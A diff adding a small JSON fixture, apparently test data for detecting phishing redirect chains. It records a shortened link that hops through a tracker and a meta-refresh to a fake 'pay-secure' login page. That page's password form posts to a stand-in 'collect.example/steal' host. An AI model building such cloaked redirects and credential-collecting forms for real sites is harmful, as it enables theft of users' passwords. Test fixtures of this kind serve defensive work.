@@ -1,0 +1,5 @@
+[
+  {"url": "https://bit.ly/3xYzAbc", "status": 301, "location": "https://tracker.example.net/r?u=https://pay-secure.example/login"},
+  {"url": "https://tracker.example.net/r?u=https://pay-secure.example/login", "status": 302, "location": "https://pay-secure.example/login", "body": "<meta http-equiv=\"refresh\" content=\"0; url=https://pay-secure.example/login\">"},
+  {"url": "https://pay-secure.example/login", "status": 200, "body": "<form method=\"post\" action=\"https://collect.example/steal\"><input type=\"password\"></form>"}
+]
